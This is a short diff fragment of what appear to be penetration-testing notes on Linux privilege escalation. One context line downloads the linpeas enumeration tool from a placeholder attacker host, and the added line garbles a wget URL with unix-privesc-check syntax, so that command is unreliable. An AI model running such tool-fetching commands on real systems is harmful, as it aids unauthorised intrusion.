@@ -6,6 +6,7 @@ OR
 
 wget http://<myip>/linpeas.exe pee.exe
 
+wget http://unix-privesc-check standard > output.txt
 
 
 ENUMERATION AND SITUATIONAL AWARENESS
